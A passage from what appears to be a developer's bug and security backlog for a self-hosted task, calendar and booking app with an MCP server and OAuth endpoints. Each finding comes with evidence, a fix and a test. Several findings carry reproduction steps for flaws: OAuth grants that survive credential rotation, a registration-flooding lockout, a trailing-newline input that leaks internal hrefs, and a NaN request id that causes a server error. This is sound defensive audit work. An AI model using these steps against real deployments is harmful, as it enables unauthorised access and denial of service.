scope='thisandfuture' (via split_series) and for recurrence_id='   '.
```

</details>

**Suggested fix.** Add the same anchor check both delete_event and update_event need — validate `recurrence_id.strip()` parses as ISO (and reject whitespace-only) right beside the existing scope guard, raising the ToolError sentence; or at minimum give delete_event the `except ValueError as exc: raise ToolError(str(exc))` that update_event already has. Add a test that a malformed recurrence_id on smylte_delete_event answers with a sentence about recurrence_id rather than about the calendar server.

**Pinned by** `test_a_malformed_recurrence_id_names_the_argument_not_the_server (parametrized: '2026-09-08 09:00', '   ', 'not-a-date' — 3 XFAILs)` in `backend/tests/test_backlog_aug19_stage1.py`.

#### [x] Every task tool accepts a calendar id and every calendar tool accepts a task-list id, so smylte_delete_list can destroy a calendar and smylte_list_tasks answers "you have none" for one

`backend/tasksd/mcp/api.py:176` · **medium** · bug · stage 3

`McpApi._href` resolves ids through `TaskService.resolve_list`, which matches any non-deleted collection by href or slug and never looks at `components`. The `kind` parameter only changes the wording of the not-found sentence; there is no check that a `list_id` names a VTODO collection or that a `calendar_id` names a VEVENT one. Task lists and calendars are drawn from the same slug namespace (`_slug(href)` for both), and the MCP server's own `instructions` string anticipates the confusion ("Task tools need a list id from smylte_list_lists; event tools need a calendar id from smylte_list_calendars") — yet nothing enforces it. The result is worse than a wrong id: a nonexistent id gets a helpful ToolError naming the right discovery tool, while a *wrong-type* id succeeds silently. `service.delete_collection` (service.py:391) has no component guard either, so `smylte_delete_list` — annotated `destructiveHint: true` with the description "Delete a task list AND every task in it" — will DELETE a whole calendar and every event on it, and answer `{"deleted": "<id>"}`. The prior sweep's suggested fix asked for exactly this test ("and for a task-list id passed to a calendar tool"); no such test exists in test_mcp.py.

<details><summary>Evidence</summary>

```
backend/tasksd/mcp/api.py:176-184
    def _href(self, list_id: str, *, kind: str = "list") -> str:
        href = self._svc.resolve_list(list_id)      # any collection, any components
        if href is None: raise ToolError(...)
        return href

backend/tasksd/service.py:210-216
    def resolve_list(self, list_id):
        for row in store.get_collections(self._conn):
            if list_id in (row["href"], _slug(row["href"])):
                return row["href"]                  # no `components` test

backend/tasksd/service.py:391-393
    def delete_collection(self, href):
        self._dav.delete_collection(href)           # no `components` test

contrast service.py:164-172 / 462-468, where list_lists filters "VTODO" in components
and list_calendars filters "VEVENT" — the two ids the model is handed come from
disjoint sets that _href happily merges again.

Failure scenario A (destructive): the account has task list `errands` and calendar
`personal-2f1a` holding 900 events. The model, holding both ids from an earlier turn,
cleans up:
  tools/call smylte_delete_list {"list_id": "personal-2f1a"}
  -> _href resolves the CALENDAR -> DELETE /dav/user/personal-2f1a/
  -> {"isError": false, "structuredContent": {"deleted": "personal-2f1a"}}
Every event is gone from Radicale and from every other CalDAV client. The tool that
announced itself as deleting "a task list AND every task in it" deleted a calendar.

Failure scenario B (silent wrong answer): 
  tools/call smylte_list_tasks {"list_id": "personal-2f1a"}
  -> service.list_tasks filters component == 'VTODO' -> []
  -> {"isError": false, "total": 0, "tasks": []}
The model reports "that list is empty" instead of "that is a calendar, not a list" —
whereas a merely misspelled id would have produced the corrective ToolError.
```

</details>

**Suggested fix.** Give `_href` the component it requires: `def _href(self, list_id, *, kind="list")` should resolve and then confirm `"VTODO"` (kind="list") or `"VEVENT"` (kind="calendar") is in that collection's components, raising the existing ToolError sentence otherwise — service already exposes the component set on the row `list_lists`/`list_calendars` filter on. Add tests asserting a calendar id passed to smylte_delete_list / smylte_list_tasks / smylte_create_task comes back isError, and vice versa for the event tools.

**Pinned by** `test_a_calendar_id_is_refused_by_the_task_tools` in `backend/tests/test_backlog_aug19_stage3_core.py`.

### MCP transport

#### [x] A JSON-RPC `id` of NaN/Infinity is echoed straight into JSONResponse, which refuses to serialize it — unhandled 500 after the tool has already written

`backend/tasksd/mcp/routes.py:489` · **high** · bug · stage 1

`parse_body` uses `json.loads`, whose default `parse_constant` ACCEPTS the bare literals `NaN`, `Infinity` and `-Infinity` (and `1e400`, which overflows to `inf`). `McpServer.handle` reads `rid = message.get("id")` and echoes it back verbatim via `_result`/`_error`, and the transport hands the result to `JSONResponse(out)` — Starlette renders with `json.dumps(..., allow_nan=False)`, which raises `ValueError: Out of range float values are not JSON compliant`. Nothing in `mcp_endpoint` or `app.py`'s handler set catches ValueError, so the request dies as a 500 with a logged traceback.

This is exactly the trap app.py already documents and works around one layer over, in `_invalid_request` (app.py:808-820): "A non-finite float round-trips through json.loads but not json.dumps, so rendering the 422 itself raised and the client got a 500 instead." The MCP transport never got the same treatment — `_call` is careful to serialize the tool result with `default=str`, but the `id` half of the envelope is never sanitized at all.

Two consequences beyond the 500:
(a) For `tools/call` the tool has ALREADY run before the envelope is serialized, so a real CalDAV write lands and the client is told the request failed. A client that retries a "failed" write duplicates it.
(b) In a batch, `run_batch` builds the whole list first, so ONE poisoned id discards every reply in the batch — the client gets a 500 and cannot tell which of the other 49 messages (possibly writes) landed. That defeats the whole reason `MAX_BATCH` refuses over-long batches "whole, not truncated".

<details><summary>Evidence</summary>

```
backend/tasksd/mcp/server.py:93,131 — `rid = message.get("id")` … `return None if is_notification else _result(rid, payload)`
backend/tasksd/mcp/routes.py:489 — `return JSONResponse(out)`
starlette JSONResponse.render → `json.dumps(content, ensure_ascii=False, allow_nan=False, ...)`

Reproduced against the real app (TestClient with raise_server_exceptions=False, a valid bearer from the real OAuth flow):

  POST /mcp  body: {"jsonrpc":"2.0","id":NaN,"method":"ping"}        -> 500 Internal Server Error
  POST /mcp  body: {"jsonrpc":"2.0","id":1e400,"method":"ping"}      -> 500 Internal Server Error
  POST /mcp  body: [{"jsonrpc":"2.0","id":1,"method":"ping"},
                    {"jsonrpc":"2.0","id":NaN,"method":"ping"}]      -> 500 (both replies lost)

Write-then-500, verified end to end:
  POST /mcp  {"jsonrpc":"2.0","id":NaN,"method":"tools/call","params":
              {"name":"smylte_create_list","arguments":{"name":"ghost-write"}}}
  -> 500 Internal Server Error
  then tools/call smylte_list_lists -> the list "ghost-write" IS present.
So the CalDAV collection was created, the caller was told the call failed, and a retry creates a second one.

No test posts a body that json.loads accepts but the response encoder rejects; `test_a_bare_scalar_body_is_an_invalid_request` and the batch battery all use well-formed ids, and the -32700 regression test (tests/test_backlog_stage1.py:73) calls `parse_body` directly rather than going through POST /mcp.
```

</details>

**Suggested fix.** Validate the id before it is trusted as a reply address: in `McpServer.handle`, after reading `rid`, reject anything that is not `None`, a `str`, or a finite int/float — e.g. `if rid is not None and not (isinstance(rid, str) or (isinstance(rid, int) and not isinstance(rid, bool)) or (isinstance(rid, float) and math.isfinite(rid))): return _error(None, INVALID_REQUEST, "id must be a string, number or null")`. Belt and braces: give the transport `parse_body` a `parse_constant` that rejects the non-finite literals outright (`json.loads(raw, parse_constant=_reject)`), so `NaN`/`Infinity` anywhere in the body becomes the -32700 the protocol defines instead of a 500.

**Pinned by** `test_a_non_finite_jsonrpc_id_gets_an_answer_not_a_500 (parametrized: NaN, -Infinity, 1e400, one poisoned id in a batch — 4 XFAILs)` in `backend/tests/test_backlog_aug19_stage1.py`.

#### [x] Disconnecting a connector is not idempotent: a retry after a lost response 404s and the SPA puts the revoked grant back in the list

`backend/tasksd/mcp/routes.py:410` · **low** · bug · `minor` · stage 3

`drop_connection` treats a family that is already gone as an error (`if not dropped: raise HTTPException(404, "unknown connection")`), and `ConnectionsSection.disconnect` treats ANY failure as "the disconnect did not happen" and restores the optimistic removal: `if (await guard(() => api.mcpDisconnect(id)) === undefined) setRows(prev)`. `makeGuard` returns `undefined` for both a dropped connection and an HttpError, so the two are indistinguishable to the caller.

Combine them and the retry-after-a-lost-response path lies to the owner about the state of a security control. The section is loaded once in a `useEffect` with an empty dep list and never refetched, so the wrong list persists for as long as the settings panel stays open.

<details><summary>Evidence</summary>

```
backend/tasksd/mcp/routes.py:407-413

        dropped = await run(request.app.state.service.oauth, _revoke_family, family_id)
        if not dropped:
            raise HTTPException(status.HTTP_404_NOT_FOUND, "unknown connection")

frontend/src/components/ConnectionsSection.tsx:34-39

    const disconnect = async (id: string) => {
      const prev = rows
      setRows((r) => r.filter((x) => x.family_id !== id))
      setConfirming(null)
      if (await guard(() => api.mcpDisconnect(id)) === undefined) setRows(prev)
    }

frontend/src/util.ts:13-24 — `guard` returns `undefined` on every throw, network error and HttpError alike.

Failure scenario: the owner opens Settings › Connected apps and clicks Disconnect on the Claude grant. The DELETE reaches the server, `revoke_oauth_family` deletes every token in the family and commits — then the Cloudflare tunnel drops the response. `guard` catches the network error, `setRows(prev)` puts the row back, and a toast appears. The owner clicks Disconnect again: the server now finds 0 rows, answers 404 "unknown connection", `guard` returns undefined again, the row is restored a second time and the toast now reads "unknown connection". The owner is looking at a Connected-apps list that still shows Claude, with an error implying the disconnect failed — while the grant is in fact already dead. `test_connections_are_listed_and_can_be_disconnected` (tests/test_mcp.py:653) asserts exactly this 404 on the second DELETE, so the suite pins the behaviour rather than catching it.
```

</details>

**Suggested fix.** Make the DELETE idempotent — `return Response(status_code=204)` whether or not `dropped`, logging only when something was actually revoked (there is no information leak: the endpoint is already cookie-gated to the owner). If the 404 is wanted as an owner-facing signal, have `ConnectionsSection.disconnect` treat a 404 as success instead of restoring the row, e.g. catch `HttpError` with `status === 404` before the generic guard.

**Pinned by** `test_disconnecting_a_connection_twice_is_not_an_error` in `backend/tests/test_backlog_aug19_stage3_core.py`.

#### [x] A JSON-RPC request (with an id) whose method starts with `notifications/` gets no reply at all, so the client waits on an id that never resolves

`backend/tasksd/mcp/server.py:114` · **low** · bug · `minor` · stage 3

`handle` computes `is_notification = "id" not in message` and honours it on every other branch — `tools/call`, unknown methods, the ToolError path, the generic exception path all read `return None if is_notification else ...`. The `notifications/` branch alone returns an unconditional `None`, discarding the id. The transport then answers `202` with an empty body (single message) or omits the entry from the batch array, so a client that sent `{"id": N, "method": "notifications/initialized"}` has an outstanding promise for id N that is never settled.

JSON-RPC 2.0 requires a response for any message carrying an `id`; shipping MCP clients have gotten this wrong (sending `notifications/initialized` with an id) and the failure mode here is a silent hang during handshake rather than a readable error.

<details><summary>Evidence</summary>

```
backend/tasksd/mcp/server.py:99,114-115

        is_notification = "id" not in message
        ...
            elif method.startswith("notifications/"):
                return None

Verified against the running app with a valid bearer:

  POST /mcp {"jsonrpc":"2.0","id":5,"method":"notifications/initialized"}
  -> 202, body b''            (expected: 200 with {"jsonrpc":"2.0","id":5,"result":{}})

In a batch the same message is simply absent from the returned array, so a client matching replies by id (which `test_a_batch_answers_each_request_and_keeps_its_ids` documents as the contract) never resolves it. `test_notifications_get_202_and_no_body` sends the id-less form only, so nothing covers this.
```

</details>

**Suggested fix.** Respect `is_notification` in that branch like every other: `elif method.startswith("notifications/"): return None if is_notification else _result(rid, {})` (an empty result is the friendly answer; `_error(rid, INVALID_REQUEST, "a notification must not carry an id")` is the strict one). Add a test posting `{"id":1,"method":"notifications/initialized"}` and asserting a 200 with id 1.

**Pinned by** `test_a_notification_method_sent_with_an_id_gets_a_reply` in `backend/tests/test_backlog_aug19_stage3_core.py`.

### MCP OAuth authorization server

#### [x] Rotating the app password (and even TASKS_SESSION_SECRET) does not revoke any MCP OAuth grant — the documented "sign out everywhere" leaves a full read/write backdoor open for 30 days

`backend/tasksd/mcp/oauth.py:551` · **high** · security · stage 2

docs/DEPLOY.md §"If the password leaks — signing out everywhere" names exactly two levers and claims each is total: change the password ("Every existing session is refused from that moment") and rotate TASKS_SESSION_SECRET ("Every session dies, including yours"). auth.py backs the first with `_credential_version` (a `cv` claim stamped into every session JWT and re-checked at auth.py:314) and the second by construction. Neither reaches the OAuth tables. `oauth_tokens` (schema.sql:238) carries no credential fingerprint, `verify_bearer` checks only kind/expiry/resource, and nothing at startup or on a credential change touches `oauth_tokens`/`oauth_clients` (grep confirms the only reference outside store.py is `count_oauth_clients`). The MCP consent screen is the app password — so anyone who has the password can mint a `mcp:read mcp:write offline_access` grant with a 30-day refresh token, and then survive the entire documented incident response with full read/write on every task, list, calendar, event and booking. The only remedy is Settings › Connected apps, which the runbook never mentions.

<details><summary>Evidence</summary>

```
Verified end-to-end against the real app (probe test, since deleted). Connect an MCP client and log in, then rebuild the app with BOTH remediations applied — `dataclasses.replace(settings, auth_password="a-brand-new-password", session_secret="z"*40)`:

    session after rotation:            401   # GET /api/me with the old cookie — the doc's claim holds
    MCP access token after rotation:   200   # POST /mcp `ping` with the pre-rotation Bearer — still works
    MCP refresh after rotation:        200   scope='mcp:read mcp:write offline_access'

The refresh succeeding is the serious half: the attacker does not merely keep a 1-hour access token, they keep rotating for the full REFRESH_TTL_S = 30*24*3600, and each rotation re-arms another 30 days. Scenario: the owner's password leaks, the attacker POSTs /oauth/register + drives the consent screen once, the owner follows docs/DEPLOY.md:247-258 to the letter (regenerate hash, restart; rotate session secret, restart), and the attacker still reads and deletes tasks and calendar events a month later.
```

</details>

**Suggested fix.** Bind grants to the credential the same way sessions are. Simplest: add a `cv TEXT` column to `oauth_tokens`, stamp `authenticator._credential_version` in `_issue_pair`, and refuse in `verify_bearer`/`_grant_refresh` when it no longer matches (the OAuthServer already receives a `verify_password` callable from routes.register; pass a `credential_version` callable alongside it). Alternatively sweep `oauth_tokens` at startup when the fingerprint changed. Either way add MCP grants to the docs/DEPLOY.md remediation list.

**Pinned by** `test_rotating_the_credentials_ends_an_mcp_grant_too` in `backend/tests/test_backlog_aug19_stage2.py`.

#### [x] A refresh that narrows scope without repeating `offline_access` returns no refresh token, and the client's RFC-mandated reuse of the old one then revokes the whole grant

`backend/tasksd/mcp/oauth.py:516` · **medium** · bug · `minor` · stage 3

`_grant_refresh` lets a client narrow scope (oauth.py:486-492) and passes the narrowed value to `_issue_pair`, which gates the new refresh token on the *narrowed* scope: `if SCOPE_OFFLINE in scope_set(scope)`. A client that sends `scope=mcp:read mcp:write` on refresh — a perfectly ordinary thing to do, since `offline_access` is a grant-shape scope rather than an API scope, and the token response itself echoes scope back — gets 200 with an access token and **no** `refresh_token`. RFC 6749 §6 is explicit that a client keeps its existing refresh token when the response omits one, so the honest client re-presents the old token on its next refresh; `use_refresh_token` reports "replayed", and `revoke_oauth_family` (oauth.py:482) deletes every token in the family. The grant is destroyed, the current access token dies instantly, and the user must re-type the app password at the consent screen with no explanation anywhere. The server's own reuse detector fires on a client doing exactly what the spec tells it to.

<details><summary>Evidence</summary>

```
Verified against the running app:

    POST /oauth/token  grant_type=refresh_token&refresh_token=R1&client_id=X&scope=mcp:read mcp:write
    -> 200 {'access_token': '...', 'expires_in': 3600, 'scope': 'mcp:read mcp:write'}
       has refresh_token? False

    POST /oauth/token  grant_type=refresh_token&refresh_token=R1&client_id=X   # RFC 6749 §6: keep the old one
    -> 400 {'error': 'invalid_grant',
            'error_description': 'this refresh token was already used; the grant has been revoked'}

    POST /mcp ping with the access token minted seconds earlier -> 401

No test covers narrowing at refresh time: test_a_refresh_cannot_widen_scope (test_mcp.py:492) only exercises the widening rejection, and test_no_refresh_token_without_offline_access (:503) only covers the authorization-code path.
```

</details>

**Suggested fix.** Decide refresh issuance from the *family's* granted scope, not the narrowed request: keep `offline_access` in the token being minted (`granted |= scope_set(row["scope"]) & {SCOPE_OFFLINE}` before calling `_issue_pair`), or pass an explicit `with_refresh=SCOPE_OFFLINE in scope_set(row["scope"])` flag into `_issue_pair` so a narrowing of the API scopes never silently ends the client's ability to refresh.

**Pinned by** `test_narrowing_scope_on_refresh_does_not_end_the_grant` in `backend/tests/test_backlog_aug19_stage3_core.py`.

#### [x] On the consent screen "Cancel" is the form's default button, so pressing Enter after typing the password declines the connection

`backend/tasksd/mcp/routes.py:638` · **medium** · rendering · `minor` · stage 4

`_consent_page` emits Cancel before Connect inside the form, both as `type="submit"`:

    '<div class="actions">'
    '<button type="submit" name="action" value="deny" class="ghost">Cancel</button>'
    '<button type="submit" name="action" value="approve">Connect</button>'

HTML implicit submission activates a form's *default button* — the first submit button in tree order — so Enter in the username or password field (and "Go"/"Done" on a mobile keyboard) submits `action=deny`. `authorize_submit` short-circuits at routes.py:266 before any password check and 303s straight back to the client with `error=access_denied&error_description=the+request+was+declined`. The user has typed their password into a form that then told the connector they refused it, and because the browser has navigated away to the client's callback there is nothing to correct in place — the whole flow has to be restarted from the client. There is no JS escape hatch either: the page's own CSP is `default-src 'none'; style-src 'unsafe-inline'`, so no script can override the default button. This is the app's single most important password form, and the SPA's own login form (frontend/src/components/Login.tsx:44) has exactly one submit button, so Enter works everywhere else.

<details><summary>Evidence</summary>

```
Button order confirmed by scraping the live GET /oauth/authorize response:

    BUTTON ORDER: ['<button type="submit" name="action" value="deny" class="ghost">',
                   '<button type="submit" name="action" value="approve">']

Sequence: user opens the consent page (username field is `autofocus`), types the username, Tab, types the password, presses Enter -> browser activates the default button (deny) -> POST action=deny -> 303 to https://claude.ai/api/mcp/auth_callback?error=access_denied&state=... The connector reports the user declined. No test covers it: `_authorize` in tests/test_mcp.py:65 always posts `action: "approve"` explicitly, so the default-button behaviour is never exercised.
```

</details>

**Suggested fix.** Make Cancel non-default: either give it `formnovalidate` and put Connect first in tree order (reversing the visual order with `flex-direction: row-reverse` on `.actions` if the Cancel-left layout is wanted), or render Cancel as a plain link/`type="button"` and treat a POST with no `action=approve` as a decline only when it carries an explicit deny marker. Pin it with a test asserting the first `<button type="submit">` in the page is `value="approve"`.

**Fixed** by taking the first of the suggested options: Connect is now first in
tree order, and `.actions` gained `flex-direction: row-reverse` in the same hunk
so the rendered row is unchanged (Cancel left, Connect right). The other two
options were rejected on this page specifically — `type="button"` is inert under
`default-src 'none'`, and rendering Cancel as a link would put the signed request
into a URL, growing a surface on the one page that must not grow one. The cost,
stated because it is real: DOM order and visual order now differ, so Tab reaches
Connect before Cancel.

The pin was widened before the fix and asserts the OUTCOME rather than where a
button sits: the read-only request approves, the read+write request approves and
grants what the CHECKED radio names, the read-only choice carried back by a
mistyped-password retry is still honoured by the default submission, and an
explicit Cancel still declines. Run against a half-fix that adds `autofocus` to
Connect while leaving Cancel first, the pin still fails — focus is not the
default button.

**Pinned by** `test_pressing_enter_on_the_consent_form_connects_rather_than_declining` in `backend/tests/test_backlog_aug19_stage45.py`.

#### [x] MAX_CLIENTS refuses new registrations instead of evicting stale ones, so anonymous registrants can lock the owner out of connecting any client for 24 h at a time

`backend/tasksd/mcp/oauth.py:208` · **low** · security · stage 2

`register` sweeps with `gc_oauth` and then refuses outright once the table holds MAX_CLIENTS=500 rows. The cap is global, but the thing it protects is not: `gc_oauth` (store.py:868) only reclaims a client whose `last_used_at` is older than CLIENT_IDLE_S = 24 h, and `last_used_at` is only advanced by `touch_oauth_client`, which runs solely on `issue_code`/`_issue_pair` — i.e. only after someone typed the app password. So 500 anonymous registrations pin the table for a full day, during which the owner's own `POST /oauth/register` gets 429 `too many registered clients` and no new MCP client can be connected at all. `_REGISTER_LIMITER` is 20/hour per `limiter_key`, and `limiter_key` collapses IPv6 to a /64 — an attacker with a /48 has 65536 distinct keys, so 500 rows/day is trivially cheap and indefinitely repeatable. The comment at oauth.py:64 ("Bounds a hostile registrant") is true of storage but converts a storage-exhaustion risk into a denial of the feature for the legitimate user.

<details><summary>Evidence</summary>

```
Verified by filling the table via the service's own store API and then registering as the owner:

    for i in range(MAX_CLIENTS): store.create_oauth_client(..., client_id=f"filler{i}", ...)
    POST /oauth/register {"redirect_uris": ["https://claude.ai/api/mcp/auth_callback"]}
    -> 429 {'error': 'invalid_request', 'error_description': 'too many registered clients'}

The branch is also completely uncovered, and the test that claims to cover it does not. `test_registration_is_capped` (tests/test_mcp.py:599) asserts only that some 429 appears within 40 requests; instrumenting it shows the 429 arrives at request 21 with body {'detail': 'too many requests, try later'} — that is `_throttle`'s HTTPException from `_REGISTER_LIMITER`, not the cap — and exactly 20 client rows exist at that point. `count_oauth_clients(conn) >= MAX_CLIENTS` never executes in the suite.
```

</details>

**Suggested fix.** Evict rather than refuse: when the table is full, delete the oldest client rows that hold no tokens (`DELETE FROM oauth_clients WHERE client_id NOT IN (SELECT client_id FROM oauth_tokens) ORDER BY last_used_at LIMIT n`) and only 429 if that frees nothing. Add a test that seeds MAX_CLIENTS rows directly and asserts the *cap's* error body, so the branch is actually exercised.

**Pinned by** `test_a_table_full_of_junk_clients_does_not_lock_the_owner_out` in `backend/tests/test_backlog_aug19_stage2.py`.

#### [x] Test gap: the confidential-client path — client_secret_basic/post, the Basic header parser and the secret comparison — has zero coverage despite being advertised in the AS metadata

`backend/tasksd/mcp/oauth.py:417` · **low** · test-gap · `minor` · stage 5

`authorization_server_metadata` advertises `client_secret_post` and `client_secret_basic` for both the token and revocation endpoints, so any client reading the metadata may pick either. The code implementing them — `_basic_auth` (routes.py:65-73: base64 decode, `split(":", 1)`, `unquote`), the `client_secret_hash` branch of `_authenticate_client` (oauth.py:417-425), and `register`'s secret minting at oauth.py:233/256 — is exercised by nothing. `grep -rn "client_secret|Basic |basic_auth" backend/tests/` returns no hits: every test registers with `token_endpoint_auth_method: "none"` via `_register`, and every token call goes through `_token`, which sends only `client_id`. Nothing verifies that a wrong secret is refused, that a confidential client cannot authenticate with `client_id` alone, or that the public-client guard at oauth.py:421 does not reject an honest client that sends `client_secret=` blank (which real clients do). This is the credential check on an internet-facing token endpoint; a regression here — a `secret or ''` slipping in, an inverted branch, `_basic_auth` returning None where it should 401 — would be silent.

<details><summary>Evidence</summary>

```
I drove the path by hand to establish the baseline the tests should pin (it behaves correctly today, which is exactly why a regression would go unnoticed):

    register token_endpoint_auth_method=client_secret_basic -> client_secret returned once
    Authorization: Basic b64(id:secret)      -> 200, tokens issued
    Authorization: Basic b64(id:nope)        -> 401 invalid_client 'bad client credentials'
    form client_id only, no secret           -> 401 invalid_client 'bad client credentials'
    register client_secret_post + form secret-> 200, tokens issued
    public client sending client_secret=""   -> 200 (the falsy-empty fallback at oauth.py:412/421)

None of these five outcomes is asserted anywhere in tests/test_mcp.py.
```

</details>

**Suggested fix.** Add a test module section that registers with each of `client_secret_basic` and `client_secret_post`, completes the code exchange with the secret, and asserts 401 for (a) a wrong secret, (b) a confidential client presenting no secret, plus a case pinning that a public client sending an empty `client_secret` is still accepted while a non-empty one is refused.

**Pinned by** `test_a_confidential_client_authenticates_with_its_secret_and_only_that` in `backend/tests/test_backlog_aug19_stage45.py`.

**Closed.** All five outcomes this entry lists are asserted, plus two it does
not: a wrong secret over `client_secret_post`, and a public client presenting an
invented secret. Verified by the mutations the entry names — inverting the
branch so a confidential client presenting NO secret is admitted (caught: the
naked case returns 200), and dropping the public-client refusal so an invented
secret is silently ignored (caught: the impostor case returns 200).

One mutation this entry suggests turned out to be benign and is recorded as
such: `sha256_hex(secret or "")` still fails the comparison against a real
stored hash, so it changes no behaviour and no test can or should catch it.

### Scheduling & public booking

#### [x] busy_intervals drops any event crossing the DST fall-back transition, so an anonymous POST double-books the owner at the identical instant

`backend/tasksd/scheduling.py:148` · **high** · bug · stage 3

The module's own `_u()` docstring states the rule: "Every comparison in this module must go through here", because `tz` is built once per link and threaded everywhere, so two datetimes sharing one ZoneInfo object are compared by CPython on their NAIVE fields. `merge`, `pad`, `clip`, `_overlaps_any` and `generate_slots` were all converted to `_u()`. `busy_intervals`' own sanity guard `if end > start:` (line 148) was not. Both operands come from `parse_event_time(...) -> .astimezone(tz)`, i.e. the same ZoneInfo object, so on the DST fall-back day an event that starts in the first pass of the repeated hour and ends in the second has end-wall-clock <= start-wall-clock and the guard silently discards it. It never reaches `merge`, so the busy set has no trace of it, `generate_slots` offers the slot sitting on top of it, and `book_slot` re-validates against the same busy set and writes the VEVENT. Any crossing event of duration <= the repeated hour is affected — including a booking this app itself wrote, since a 30-minute booking of the 01:30 CDT slot is exactly 06:30Z->07:00Z = 01:30 -> 01:00 local. This is the only unauthenticated write path into the owner's calendar, and `generate_slots` deliberately offers both passes of the repeated hour (test_fall_back_offers_the_repeated_hour), so those slots are real and reachable.

<details><summary>Evidence</summary>

```
backend/tasksd/scheduling.py:141-149

    start = parse_event_time(ev["start"], tz, naive_tz)
    if ev.get("end"):
        end = parse_event_time(ev["end"], tz, naive_tz)
    ...
    if end > start:                 # <-- wall clock: start.tzinfo IS end.tzinfo
        out.append(Interval(start, end))

Driven against the real module (tz=America/Chicago, 2026-11-01 fall-back):

    06:30Z->07:00Z (30m, this app's own booking of the 01:30 CDT slot) -> busy=[]
    06:30Z->07:30Z (1h meeting across the transition)                  -> busy=[]
    06:45Z->07:15Z (30m across)                                        -> busy=[]
    06:00Z->06:30Z (control, no crossing)                              -> busy=[01:00-05:00 .. 01:30-05:00]

End-to-end through the real TaskService (in-memory DB, one VEVENT collection seeded
with DTSTART:20261101T063000Z / DTEND:20261101T070000Z — the owner's existing
commitment; link tz America/Chicago, availability {"6": ["00:00-05:00"]}, duration 30,
min_notice 0, now = 2026-11-01T05:30:00Z):

    svc.public_link_info(tok, now=NOW)  -> "2026-11-01T01:30:00-05:00" IS advertised as free
    svc.book_slot(tok, start_iso="2026-11-01T01:30:00-05:00", ...) -> accepted, created=True
    VEVENT written at 2026-11-01 06:30:00+00:00 -> 2026-11-01 07:00:00+00:00

That is byte-for-byte the same instant as the event already on the calendar: two
events, two people, one 30-minute window, written by an anonymous request.

No test can see it. test_busy_intervals_naive_and_aware (tests/test_scheduling.py:77)
uses an ordinary July day, and the DST battery's only busy fixture
(test_fall_back_busy_in_one_pass_leaves_the_other_bookable, :313) uses 06:00Z-06:30Z,
which lies entirely inside the first pass and never crosses 07:00Z.
```

</details>

**Suggested fix.** Route the guard through `_u` like every other comparison in the module: `if _u(end) > _u(start):`. Add a busy_intervals case for an event spanning the transition (06:30Z->07:00Z on 2026-11-01, tz America/Chicago) asserting one interval of exactly 30 minutes of absolute time, plus a book_slot test asserting that after a booking at 01:30 CDT a second POST for the same instant raises SlotTaken.

**Pinned by** `test_a_meeting_across_the_fall_back_transition_still_blocks_its_slot` in `backend/tests/test_backlog_aug19_stage3_ical.py`.

#### [x] _check_client_id's regex accepts a trailing newline, so an anonymous booking POST answers 409 with the owner's internal CalDAV href

`backend/tasksd/app.py:157` · **medium** · security · `minor` · stage 2

`_CLIENT_ID_RE = re.compile(r"^[0-9a-f]{16,64}$")` is used with `re.match`, and Python's `$` matches at end-of-string OR just before a trailing newline — so `"0123456789abcdef\n"` passes a validator whose message says "16-64 lowercase hex characters" and whose comment says the value "must stay in Radicale's canonical URL-safe form (plain hex)". The value becomes the resource slug: `href = f"{collection_href}{slug}.ics"` and `uid = f"{slug}@tasksd"` (sync/engine.py:286-289). `DavClient.abs()` builds the URL with `urljoin`, and CPython's urlsplit strips ASCII tab/newline from URLs, so the PUT lands on `<collection>/<hex>.ics` — the href WITHOUT the newline. Two consequences on the one unauthenticated write path: (1) client_id `X` and client_id `X\n` address the same Radicale resource but carry different UIDs, so `_put_new` gets a 412, refetches, sees a UID mismatch and raises `ConflictError(f"a different resource already exists at {href}")`, which app.py:825-827 returns verbatim as a 409 body — disclosing the Radicale username and the target collection's href to an anonymous caller, the one thing the public payload is explicitly built never to expose (test_public_page_requires_no_auth_and_leaks_nothing asserts "No hrefs, calendar names, or event details in the payload"); (2) `DavClient.get` returns `Item(href=href, ...)` with the requested href, so `_refresh_from_wire` writes an items row whose href does not exist on the server, and a raw control character reaches items.uid, bookings.event_uid and the ICS UID.

<details><summary>Evidence</summary>

```
backend/tasksd/app.py:155-162

    # The client-supplied creation id becomes the resource's href slug, so it must
    # stay in Radicale's canonical URL-safe form (plain hex - see engine.create_task).
    _CLIENT_ID_RE = re.compile(r"^[0-9a-f]{16,64}$")
    def _check_client_id(cid):
        if cid is not None and not _CLIENT_ID_RE.match(cid): raise HTTPException(422, ...)

Verified against the pinned interpreter:

    re.match(r"^[0-9a-f]{16,64}$", "0123456789abcdef")     -> match
    re.match(r"^[0-9a-f]{16,64}$", "0123456789abcdef\n")   -> match      <-- accepted
    urljoin('http://h:5233/', 'u/cal/0123456789abcdef\n.ics')
        -> 'http://h:5233/u/cal/0123456789abcdef.ics'                    <-- newline stripped

Failure scenario (both requests are ordinary anonymous POSTs against a published link,
both naming genuinely open slots):
  1. POST .../book {client_id: "0123456789abcdef", start: slotA, ...} -> 201.
     Resource created at <collection>/0123456789abcdef.ics, UID 0123456789abcdef@tasksd.
  2. POST .../book {client_id: "0123456789abcdef\n", start: slotB, ...}
     - get_booking_by_event("0123456789abcdef\n@tasksd") -> None (not a replay)
     - slotB validates, build_new_event escapes the newline fine
     - _put_new PUTs to <collection>/0123456789abcdef.ics with If-None-Match:* -> 412
     - refetch: stored UID 0123456789abcdef@tasksd != 0123456789abcdef\n@tasksd
     - ConflictError -> 409 {"detail": "a different resource already exists at
       /<radicale-user>/<calendar-uuid>/0123456789abcdef\n.ics"}
  The route's `except BaseException: public_post_link_limiter.release(link_key)` gives
  the credit back, so the probe is free and repeatable. No test feeds _check_client_id
  a trailing newline (grep for _CLIENT_ID_RE in backend/tests returns nothing).
```

</details>

**Suggested fix.** Use `re.fullmatch` (or anchor with `\\Z` instead of `$`) in `_check_client_id`; the same trap applies to `_RANGE_RE` in scheduling.py:25, which is used with `.match` too. Separately, do not hand a raw engine href to an anonymous caller: map `ConflictError` on the public booking route to a fixed 409 message the way SlotTaken already is. Add a test that a client_id of 16 hex chars plus "\n" is a 422.

**Pinned by** `test_a_client_id_with_a_trailing_newline_is_refused` in `backend/tests/test_backlog_aug19_stage2.py`.

#### [x] busy_intervals derives a DURATION-only event's end by wall-clock addition, so across a DST transition it blocks the wrong hour

`backend/tasksd/scheduling.py:145` · **medium** · bug · `minor` · stage 3

